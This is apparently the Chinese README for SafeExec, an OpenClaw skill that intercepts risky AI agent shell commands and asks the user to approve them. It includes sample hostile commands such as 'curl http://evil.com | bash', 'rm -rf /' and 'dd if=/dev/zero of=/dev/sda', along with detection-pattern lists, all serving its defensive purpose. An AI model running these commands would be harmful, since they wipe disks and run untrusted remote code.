# SafeExec - AI Agent 安全防护层

> 🛡️ 为 AI Agent 添加最后一道防线 - 拦截危险命令，保护你的系统

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blue)](https://openclaw.ai)
[![Security](https://img.shields.io/badge/Security-Critical-red)]()

**🌐 Languages:** [中文](README.md) | [English](README_EN.md)

---

## ✨ 为什么需要 SafeExec？

AI Agents 是强大的助手，但也可能造成严重损害：

- 💥 **误删数据** - 一句"清理临时文件"可能变成 `rm -rf /`
- 🔥 **系统破坏** - "优化磁盘"可能执行 `dd if=/dev/zero of=/dev/sda`
- 🚪 **安全漏洞** - "安装这个工具"可能运行 `curl http://evil.com | bash`

**SafeExec 就是为解决这个问题而生。**

---

## 🎯 核心功能

### 1️⃣ 智能风险评估

自动检测 10+ 类危险操作：

| 风险等级 | 检测模式 | 说明 |
|---------|---------|------|
| 🔴 **CRITICAL** | `rm -rf /` | 删除系统文件 |
| 🔴 **CRITICAL** | `dd if=` | 磁盘破坏 |
| 🔴 **CRITICAL** | `mkfs.*` | 格式化文件系统 |
| 🔴 **CRITICAL** | Fork bomb | 系统 DoS |
| 🟠 **HIGH** | `chmod 777` | 权限提升 |
| 🟠 **HIGH** | `curl | bash` | 代码注入 |
| 🟠 **HIGH** | 写入 `/etc/` | 系统配置篡改 |
| 🟡 **MEDIUM** | `sudo` | 特权操作 |
| 🟡 **MEDIUM** | 防火墙修改 | 网络暴露 |

### 2️⃣ 命令拦截与审批

```
用户请求 → AI Agent → safe-exec 执行
                         ↓
                    风险评估
                    /      \
               安全      危险
                |          |
              执行      拦截 + 通知
                         ↓
                    等待用户批准
                         ↓
              [批准] → 执行 / [拒绝] → 取消
```

### 3️⃣ 完整审计追踪

所有操作都被记录到 `~/.openclaw/safe-exec-audit.log`：

```json
{
  "timestamp": "2026-01-31T16:44:17.217Z",
  "event": "approval_requested",
  "requestId": "req_1769877857_2352",
  "command": "rm -rf /tmp/test\n",
  "risk": "critical",
  "reason": "删除根目录或家目录文件"
}
```

---

## ⚡ 5 分钟快速开始

### 第 1 步：安装 SafeExec

```bash
# 克隆到 OpenClaw skills 目录
git clone https://github.com/OTTTTTO/safe-exec.git ~/.openclaw/skills/safe-exec

# 添加执行权限
chmod +x ~/.openclaw/skills/safe-exec/*.sh

# 创建全局命令
ln -sf ~/.openclaw/skills/safe-exec/safe-exec.sh ~/.local/bin/safe-exec
```

### 第 2 步：测试 SafeExec

```bash
# 测试安全命令（直接执行）
safe-exec "echo 'Hello SafeExec!'"
# 输出: Hello SafeExec!

# 测试危险命令（被拦截）
safe-exec "rm -rf /tmp/test"
# 输出: 🚨 危险操作检测 - 命令已拦截
```

### 第 3 步：在 OpenClaw 中使用

在 OpenClaw Chat 中说：

```
开启 SafeExec
```

然后试着执行危险命令：

```
删除 /tmp/test 文件夹
```

OpenClaw 会自动拦截并询问您的批准！

### 第 4 步：批准或拒绝

```
批准 req_xxxxx    # 执行命令
拒绝 req_xxxxx    # 取消命令
```

就这么简单！🎉

---

## 📦 详细安装

### OpenClaw Skill 安装（推荐）

```bash
# 1. 克隆仓库
git clone https://github.com/OTTTTTO/safe-exec.git ~/.openclaw/skills/safe-exec

# 2. 添加执行权限
chmod +x ~/.openclaw/skills/safe-exec/*.sh

# 3. 创建全局命令链接
ln -sf ~/.openclaw/skills/safe-exec/safe-exec.sh ~/.local/bin/safe-exec
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-approve.sh ~/.local/bin/safe-exec-approve
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-reject.sh ~/.local/bin/safe-exec-reject
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-list.sh ~/.local/bin/safe-exec-list

# 4. 测试安装
safe-exec "echo 'Hello SafeExec!'"
```

### 手动安装

```bash
# 下载脚本到 PATH
curl -o ~/.local/bin/safe-exec https://raw.githubusercontent.com/OTTTTTO/safe-exec/main/safe-exec.sh
chmod +x ~/.local/bin/safe-exec
```

---

## 🚀 使用方法

### 基础使用

```bash
# 执行命令（安全命令直接执行）
safe-exec "ls -la"
# 输出: (直接显示结果)

# 危险命令会被拦截
safe-exec "rm -rf /tmp/test"
# 输出: 🚨 危险操作检测 - 命令已拦截
#       需要批准才能执行

# 查看待处理的请求
safe-exec --list
# 输出: 📋 待处理的批准请求
#       [0] req_xxxxx - rm -rf /tmp/test (CRITICAL)

# 批准请求
safe-exec-approve req_xxxxx
# 输出: ✅ 执行命令: rm -rf /tmp/test

# 拒绝请求
safe-exec-reject req_xxxxx
# 输出: ❌ 请求已拒绝

# 查看状态
safe-exec --status
# 输出: 🛡️ SafeExec 状态
#       状态: ✅ 已启用

# 临时禁用（仅用于可信环境）
safe-exec --disable

# 重新启用
safe-exec --enable
```

### 快捷命令技巧

```bash
# 快速批准最新的请求
safe-exec-approve $(ls -t ~/.openclaw/safe-exec/pending/ | head -1 | sed 's/.json//')

# 查看所有待处理请求
safe-exec --list | grep "req_"

# 查看最近的审计日志
tail -20 ~/.openclaw/safe-exec-audit.log | jq .

# 统计拦截次数
grep "approval_requested" ~/.openclaw/safe-exec-audit.log | wc -l
```

### 在 OpenClaw Agent 中使用

**完整使用流程示例：**

#### 📱 场景：在 OpenClaw Chat 中清理临时文件

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 用户

开启 SafeExec 保护
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 OpenClaw Agent

✅ SafeExec 已启用！

现在所有危险命令都会被拦截并需要您的批准。
保护的命令包括：
  • rm -rf / (删除系统文件)
  • dd if= (磁盘破坏)
  • chmod 777 (权限提升)
  • curl | bash (代码注入)
  • ... 更多规则

状态：🛡️ 运行中
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 用户

帮我强制删除 /tmp/test 文件夹的所有内容
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 OpenClaw Agent

🚨 **危险操作检测 - 命令已拦截**

**风险等级:** 🔴 CRITICAL
**命令:** `rm -rf /tmp/test`
**原因:** 删除根目录或家目录文件
**匹配规则:** `rm -rf? [\/~]`

**请求 ID:** `req_1769877857_2352`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  此命令需要用户批准才能执行
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **将要执行的操作：**
  • 删除目录: /tmp/test
  • 删除模式: 递归强制删除
  • 影响范围: 该目录下的所有文件和子目录

⏰ 请求将在 5 分钟后过期

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **批准方法：**
1. 直接回复: `批准 req_1769877857_2352`
2. 或回复: `safe-exec-approve req_1769877857_2352`

🚫 **拒绝方法：**
1. 直接回复: `拒绝 req_1769877857_2352`
2. 或回复: `safe-exec-reject req_1769877857_2352`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 用户

批准 req_1769877857_2352
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 OpenClaw Agent

✅ **请求已批准 - 正在执行命令**

**命令:** `rm -rf /tmp/test`
**状态:** 执行成功
**删除的文件:** 15 个文件，3 个目录

✨ 操作完成！SafeExec 继续保护中。
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 用户

关闭 SafeExec
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 OpenClaw Agent

⚠️  **SafeExec 已禁用**

⚠️  所有命令将直接执行，不受保护！

建议仅在以下情况下禁用：
  ✓ 在可信环境中
  ✓ 需要批量执行已知安全的命令
  ✓ 测试和调试

恢复保护: 开启 SafeExec
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

#### 🔥 更多实际场景

**场景 1：防止数据删除**
```
你: 清理一下家目录下的所有日志文件

🤖: 🚨 检测到危险操作！
    命令: rm -rf ~/logs/*
    风险: CRITICAL
    建议: 改用 rm ~/logs/*.log（仅删除文件，不递归）

你: 好的，那就只删除日志文件

🤖: ✅ 执行: rm ~/logs/*.log
    删除了 23 个日志文件
```

**场景 2：防止代码注入**
```
你: 从这个 URL 安装工具：curl http://example.com/install.sh | bash

🤖: 🚨 检测到高风险操作！
    命令: curl http://example.com/install.sh | bash
    风险: HIGH（管道下载到 shell）
    建议:
      1. 先下载脚本: curl -o install.sh http://example.com/install.sh
      2. 检查内容: cat install.sh
      3. 确认安全后再执行

你: 好的，我先检查一下脚本

🤖: ✅ 安全建议已采纳
```

**场景 3：防止系统破坏**
```
你: 帮我格式化这个 U 盘

🤖: 🚨 检测到严重危险操作！
    命令: mkfs.ext4 /dev/sdb
    风险: CRITICAL（格式化文件系统）
    原因: 这会永久删除 /dev/sdb 上的所有数据

⚠️  请确认:
  • 设备: /dev/sdb (8GB USB Device)
  • 操作: 格式化为 ext4
  • 数据丢失: 是

    真的要继续吗？请回复 "我确认格式化 /dev/sdb"

你: 等等，我搞错了设备！是 /dev/sdc

🤖: ✅ 已拦截，避免数据丢失 😅
```

---

## 🔗 OpenClaw Agent 集成

### 自动拦截模式

**在 OpenClaw 配置中启用 SafeExec：**

编辑 OpenClaw 配置文件（通常是 `~/.openclaw/config.json`）：

```json
{
  "tools": {
    "exec": {
      "security": "allowlist",
      "allowlist": [
        "safe-exec*",
        "ls",
        "cat",
        "echo"
      ]
    }
  }
}
```

### AI 助手最佳实践

#### 方式 1：包装所有危险命令

告诉 AI 助手使用 safe-exec 执行所有可能危险的命令：

```
你: 从现在开始，所有删除、修改系统文件、或使用 sudo 的命令，都要通过 safe-exec 执行

🤖: 明白！我会将以下类型的命令通过 safe-exec 执行：
    • rm, mv, cp（涉及系统目录）
    • chmod, chown
    • 所有 sudo 命令
    • curl/wget 管道操作
```

#### 方式 2：自动检测模式

使用 OpenClaw 的 HEARTBEAT 功能检查待处理的批准请求：

在 `HEARTBEAT.md` 中添加：

````markdown
# 心跳检查

每次心跳时运行：

\`\`\`bash
safe-exec --check-pending 2>/dev/null || echo "✅ 无待处理的批准请求"
\`\`\`

如果有待处理的请求，提醒用户。
````

#### 方式 3：智能拦截

配置 OpenClaw 的 exec 工具，自动将危险命令路由到 safe-exec：

```python
# 在 OpenClaw Agent 配置中
def should_use_safeexec(command):
    dangerous_patterns = [
        'rm -rf',
        'dd if=',
        'mkfs',
        'chmod 777',
        'curl | bash',
        'sudo'
    ]
    return any(pattern in command for pattern in dangerous_patterns)

# Agent 会自动调用 safe-exec
```

### OpenClaw 集成示例

#### 示例 1：Feishu 群组集成

```yaml
# OpenClaw 配置
channels:
  feishu:
    groups:
      - id: "oc_xxxxx"
        name: "开发团队"
        safeexec:
          enabled: true
          auto_approve:
            risk: "low"
          notify: true
```

#### 示例 2：Telegram Bot 集成

```bash
# 添加内联按钮支持
# 用户可以直接点击"批准"或"拒绝"按钮

Telegram Bot:
🚨 SafeExec 批准请求

命令: rm -rf /tmp/test
风险: CRITICAL

[✅ 批准]  [❌ 拒绝]  [📋 详情]
```

---

## ⚙️ 配置

### 自定义规则

编辑 `~/.openclaw/safe-exec-rules.json`：

```json
{
  "rules": [
    {
      "pattern": "YOUR_REGEX_PATTERN",
      "risk": "high",
      "description": "你的自定义规则描述"
    }
  ]
}
```

### 环境变量

```bash
# 审计日志路径
export SAFE_EXEC_AUDIT_LOG="$HOME/.openclaw/safe-exec-audit.log"

# 请求超时时间（秒）
export SAFE_EXEC_TIMEOUT=300

# Feishu 群组 ID（用于通知）
export SAFE_EXEC_FEISHU_GROUP="oc_xxxxx"
```

---

## 📊 工作原理

```
┌─────────────────────────────────────────────┐
│         用户 / AI Agent                      │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
         ┌─────────────────┐
         │   safe-exec     │
         │   (入口点)       │
         └────────┬─────────┘
                  │
                  ▼
         ┌─────────────────┐
         │   风险评估引擎   │
         │                 │
         │ • 模式匹配      │
         │ • 风险分级      │
         │ • 规则引擎      │
         └────────┬─────────┘
                  │
        ┌─────────┴─────────┐
        │                   │
   [安全]              [危险]
        │                   │
        ▼                   ▼
   直接执行          拦截 + 通知
        │                   │
        │              ┌─────┴─────┐
        │              │           │
        │           等待批准      审计日志
        │              │
        │         ┌────┴────┐
        │         │         │
        │      [批准]    [拒绝]
        │         │         │
        │         ▼         ▼
        │      执行      取消
        │         │
        └─────────┴─────────┘
                  │
                  ▼
           ┌─────────────┐
           │   审计日志   │
           └─────────────┘
```

---

## 🔒 安全特性

- ✅ **零信任** - 所有命令默认需要审批
- ✅ **完整审计** - 记录所有安全事件
- ✅ **不可变日志** - 审计日志采用追加模式
- ✅ **最小权限** - 不需要额外的系统权限
- ✅ **透明性** - 用户始终知道正在执行什么
- ✅ **可配置** - 灵活的规则系统

---

## 🧪 测试

```bash
# 运行测试套件
bash ~/.openclaw/skills/safe-exec/test.sh

# 手动测试
safe-exec "echo '安全命令测试'"
safe-exec "rm -rf /tmp/test-dangerous"
```

---

## 📈 路线图

### v0.2.0 (进行中)
- [ ] 支持更多通知渠道（Telegram, Discord）
- [ ] Web UI 审批界面
- [ ] 更智能的风险评估（机器学习）
- [ ] 批量操作支持

### v0.3.0 (计划中)
- [ ] 多用户支持
- [ ] RBAC 权限控制
- [ ] 审计日志加密
- [ ] SIEM 集成

### v1.0.0 (未来)
- [ ] 企业级功能
- [ ] SaaS 部署支持
- [ ] 完整的 API

---

## 🤝 贡献

欢迎贡献！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。

```bash
# Fork 仓库
git clone https://github.com/OTTTTTO/safe-exec.git

# 创建功能分支
git checkout -b feature/amazing-feature

# 提交更改
git commit -m "Add amazing feature"

# 推送到分支
git push origin feature/amazing-feature

# 开启 Pull Request
```

---

## 💡 最佳实践

### 1. 开发环境配置

**✅ 推荐配置：**

```bash
# 在 ~/.bashrc 或 ~/.zshrc 中添加
export SAFE_EXEC_TIMEOUT=300           # 5 分钟超时
export SAFE_EXEC_AUDIT_LOG="$HOME/.openclaw/safe-exec-audit.log"

# 别名 - 快速命令
alias se='safe-exec'
alias sea='safe-exec-approve'
alias ser='safe-exec-reject'
alias sel='safe-exec-list'
```

### 2. 团队协作建议

**共享规则集：**

```bash
# 1. 创建团队规则文件
cat > team-rules.json << EOF
{
  "enabled": true,
  "rules": [
    {"pattern": "\\brm\\s+-rf", "risk": "critical", "description": "团队规则：禁止递归删除"},
    {"pattern": "production.*restart", "risk": "critical", "description": "团队规则：生产环境重启"}
  ]
}
EOF

# 2. 提交到版本控制
git add team-rules.json
git commit -m "Add team SafeExec rules"

# 3. 团队成员拉取并导入
git pull
safe-exec-add-rule --import team-rules.json
```

### 3. 生产环境使用

**分阶段部署：**

```bash
# 第 1 阶段：监控模式（不拦截）
export SAFE_EXEC_MODE="monitor"
# 所有命令仅记录日志，不拦截

# 第 2 阶段：低风险拦截
export SAFE_EXEC_MODE="strict-low"
# 仅拦截 critical 和 high 级别

# 第 3 阶段：完全启用
export SAFE_EXEC_MODE="strict"
# 拦截所有 medium 及以上级别
```

### 4. 与 CI/CD 集成

**GitHub Actions 示例：**

```yaml
name: SafeExec Check

on: [push, pull_request]

jobs:
  safeexec-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Install SafeExec
        run: |
          git clone https://github.com/OTTTTTO/safe-exec.git ~/.local/bin/safe-exec
          chmod +x ~/.local/bin/safe-exec/*

      - name: Check deployment scripts
        run: |
          for script in deploy/*.sh; do
            echo "Checking $script..."
            safe-exec --dry-run "$script"
          done
```

### 5. 应急响应流程

**当检测到危险操作时：**

```bash
# 1. 立即禁用 SafeExec（防止误操作）
safe-exec --disable

# 2. 检查审计日志
grep "approval_requested" ~/.openclaw/safe-exec-audit.log | tail -20

# 3. 分析命令模式
jq '.command' ~/.openclaw/safe-exec-audit.log | sort | uniq -c | sort -rn

# 4. 添加新规则（如果需要）
safe-exec-add-rule "dangerous-pattern" "critical" "新发现的威胁"

# 5. 重新启用
safe-exec --enable

# 6. 通知团队
# echo "SafeExec 规则已更新，请拉取最新配置" | slack-notify
```

### 6. 性能优化

**减少延迟：**

```bash
# 使用更快的正则表达式引擎
export SAFE_EXEC_REGEX_ENGINE="re2"

# 缓存规则解析结果
export SAFE_EXEC_CACHE_ENABLED=true

# 并行处理（批量操作）
export SAFE_EXEC_PARALLEL=true
```

### 7. 安全加固

**防止绕过：**

```bash
# 1. 设置 PATH 优先级
export PATH="$HOME/.local/bin/safe-exec:$PATH"

# 2. 创建别名覆盖常用命令
alias rm='safe-exec rm'
alias sudo='safe-exec sudo'

# 3. 监控直接调用
watch -n 5 'ps aux | grep -v "safe-exec" | grep -E "(rm|dd|mkfs)"'
```

### 8. 审计和合规

**生成合规报告：**

```bash
#!/bin/bash
# generate-compliance-report.sh

REPORT_DATE=$(date +%Y-%m)
OUTPUT="safeexec-compliance-$REPORT_DATE.json"

jq -s '
  group_by(.event) |
  map({
    event: .[0].event,
    count: length,
    examples: [.[].command // empty] | unique | .[0:5]
  })
' ~/.openclaw/safe-exec-audit-log-* > "$OUTPUT"

echo "✅ 合规报告已生成: $OUTPUT"
```

---

## ❓ 常见问题（FAQ）

### Q1: SafeExec 会影响命令执行性能吗？

**A:** 不会。对于安全命令，SafeExec 仅进行快速模式匹配（< 1ms）。只有危险命令才会触发审批流程。

### Q2: 我可以临时禁用 SafeExec 吗？

**A:** 可以！使用以下命令：

```bash
# 临时禁用（当前会话）
safe-exec --disable

# 执行完危险命令后重新启用
safe-exec --enable
```

⚠️ **注意:** 仅在可信环境中禁用！

### Q3: 如何查看我的命令历史？

**A:** 查看审计日志：

```bash
# 实时查看
tail -f ~/.openclaw/safe-exec-audit.log

# 格式化显示
jq '.' ~/.openclaw/safe-exec-audit.log | less

# 查看最近 10 条拦截
grep "approval_requested" ~/.openclaw/safe-exec-audit.log | tail -10
```

### Q4: SafeExec 能防止所有危险操作吗？

**A:** SafeExec 可以防止绝大多数常见的危险操作，但不能保证 100%：

✅ **能防止：**
- 删除系统文件（rm -rf /）
- 磁盘破坏（dd, mkfs）
- 权限提升（chmod 777, sudo）
- 代码注入（curl | bash）

❌ **不能防止：**
- 已经被入侵的系统
- 直接操作硬件
- 社会工程学攻击

### Q5: 我可以添加自己的规则吗？

**A:** 当然！有三种方式：

**方式 1：使用 safe-exec-add-rule（推荐）**
```bash
safe-exec-add-rule "\\bmy-dangerous-cmd" "high" "我的危险命令"
```

**方式 2：直接编辑 JSON**
```bash
jq '.rules += [{"pattern": "my-pattern", "risk": "high"}]' \
  ~/.openclaw/safe-exec-rules.json > tmp.json && mv tmp.json ~/.openclaw/safe-exec-rules.json
```

**方式 3：使用内置规则管理工具**
```bash
safe-exec-add-rule --help  # 查看详细用法
```

### Q6: 批准请求会过期吗？

**A:** 是的，默认 5 分钟后过期。你可以修改超时时间：

```bash
# 临时修改（当前会话）
export SAFE_EXEC_TIMEOUT=600  # 10 分钟

# 永久修改（添加到 ~/.bashrc）
echo 'export SAFE_EXEC_TIMEOUT=600' >> ~/.bashrc
```

### Q7: 如何在多台机器上同步规则？

**A:** 导出并导入规则：

```bash
# 在机器 A 上导出
safe-exec-add-rule --export
# 生成: safe-exec-rules-backup-20250201-120000.json

# 复制到机器 B
scp safe-exec-rules-backup-*.json machine-b:~/

# 在机器 B 上导入
safe-exec-add-rule --import safe-exec-rules-backup-*.json
```

### Q8: SafeExec 会记录我的敏感信息吗？

**A:** 不会。SafeExec 只记录：
- 命令本身（不包含参数中的密码、Token 等）
- 时间戳
- 风险评估结果

如果你的命令包含敏感信息，建议：
1. 使用环境变量：`export MY_SECRET="xxx"` 然后用 `$MY_SECRET`
2. 使用配置文件
3. 使用密钥管理工具

### Q9: 我可以批量批准请求吗？

**A:** 当前版本不支持，但这是一个计划中的功能。你可以手动批准多个请求：

```bash
# 快速批准所有待处理的请求
for req in ~/.openclaw/safe-exec/pending/*.json; do
    req_id=$(basename "$req" .json)
    safe-exec-approve "$req_id"
done
```

### Q10: SafeExec 与 sudo 有什么区别？

**A:** 它们解决不同的问题：

| 特性 | SafeExec | sudo |
|------|----------|------|
| **目的** | 防止 AI 犯错 | 提升普通用户权限 |
| **使用场景** | AI Agent 环境 | 日常系统管理 |
| **审批机制** | 基于风险评估 | 基于用户权限 |
| **日志** | 完整的审计日志 | 系统日志 |
| **集成** | OpenClaw Agent | 操作系统 |

**最佳实践：结合使用**
```bash
# SafeExec 拦截危险命令
safe-exec "sudo rm -rf /tmp/test"
#  ↓ 需要批准
#  ↓ 批准后
#  ↓ sudo 再次验证权限
sudo rm -rf /tmp/test
```

### 🆘 遇到问题？

1. **检查状态**: `safe-exec --status`
2. **查看日志**: `tail -50 ~/.openclaw/safe-exec-audit.log`
3. **测试命令**: `safe-exec "echo 'test'"`
4. **提交问题**: [GitHub Issues](https://github.com/OTTTTTO/safe-exec/issues)

---

## 📝 许可证

MIT License - 详见 [LICENSE](LICENSE) 文件

---

## 🙏 致谢

- [OpenClaw](https://openclaw.ai) - 强大的 AI Agent 框架
- [Sudo](https://www.sudo.ws/) - 启发了审批机制的设计
- 所有贡献者和用户

---

## 📮 联系方式

- **GitHub Issues**: [提交问题](https://github.com/OTTTTTO/safe-exec/issues)
- **Email**: 731554297@qq.com
- **Discord**: [OpenClaw Community](https://discord.gg/clawd)

---

## 🌟 Star History

如果这个项目对你有帮助，请给个 Star ⭐

[![Star History Chart](https://api.star-history.com/svg?repos=OTTTTTO/safe-exec&type=Date)](https://star-history.com/#OTTTTTO/safe-exec&Date)

---

**Made with ❤️ by the OpenClaw community**

> "AI 是强大的助手，但安全永远是第一优先级。"
